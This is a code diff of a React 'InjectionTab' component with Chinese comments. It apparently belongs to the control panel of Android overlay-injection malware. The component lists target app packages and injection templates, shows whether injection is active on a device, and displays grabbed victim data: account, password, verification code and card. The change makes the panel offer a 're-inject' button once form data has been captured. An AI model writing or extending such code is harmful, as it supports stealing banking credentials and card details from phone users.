@@ -472,8 +472,8 @@ export default function InjectionTab({
                 const gData = parseGrabbedData ? parseGrabbedData(grabbed?.data) : {}
                 const hasData = !!(gData.account || gData.password || gData.verification || gData.card)
                 // 自动注入开关只表示功能已启用；实际运行态以活跃任务为准。
-                // 历史采集数据不等于当前任务已停止。当 APK/DB 确认仍在注入时，
-                // 即使有旧数据也要显示“停止注入”。
+                // 一旦已经获取到本次表单数据，用户下一步需要的是重新开始一轮注入，
+                // 因此操作按钮优先显示“重注”；没有数据但任务仍活跃时才显示“停止注入”。
                 const isActive = injActivePkgs.has(packageName) || injActiveIds.has(tpl.id || tpl.templateId || tpl.template_id)
                 const isConfirmed = injConfirmedPkgs.has(packageName) || injConfirmedIds.has(tpl.id || tpl.templateId || tpl.template_id)
                 const isLoading = injLoadingPkg === packageName
@@ -512,10 +512,12 @@ export default function InjectionTab({
                       </div>
                     )}
                     <div style={{ display: 'flex', gap: 6, paddingTop: 8, borderTop: '1px solid rgba(255,255,255,.05)' }}>
-                      {isInjecting ? (
+                      {hasData ? (
+                        <button onClick={() => startInjection(tpl)} disabled={isLoading} style={{ flex: 1, padding: '6px 0', fontSize: 11, fontWeight: 600, borderRadius: 6, border: '1px solid rgba(24,144,255,.3)', background: 'rgba(24,144,255,.1)', color: '#38bdf8', cursor: isLoading ? 'wait' : 'pointer' }}>{isLoading ? '重注中...' : '重注'}</button>
+                      ) : isInjecting ? (
                         <button onClick={() => stopInjection(tpl)} style={{ flex: 1, padding: '6px 0', fontSize: 11, fontWeight: 600, borderRadius: 6, border: '1px solid rgba(239,68,68,.3)', background: 'rgba(239,68,68,.1)', color: '#f87171', cursor: 'pointer' }}>停止注入</button>
                       ) : (
-                        <button onClick={() => startInjection(tpl)} style={{ flex: 1, padding: '6px 0', fontSize: 11, fontWeight: 600, borderRadius: 6, border: '1px solid rgba(24,144,255,.3)', background: 'rgba(24,144,255,.1)', color: '#38bdf8', cursor: 'pointer' }}>{hasData ? '重注' : '注入'}</button>
+                        <button onClick={() => startInjection(tpl)} style={{ flex: 1, padding: '6px 0', fontSize: 11, fontWeight: 600, borderRadius: 6, border: '1px solid rgba(24,144,255,.3)', background: 'rgba(24,144,255,.1)', color: '#38bdf8', cursor: 'pointer' }}>注入</button>
                       )}
                     </div>
                   </div>
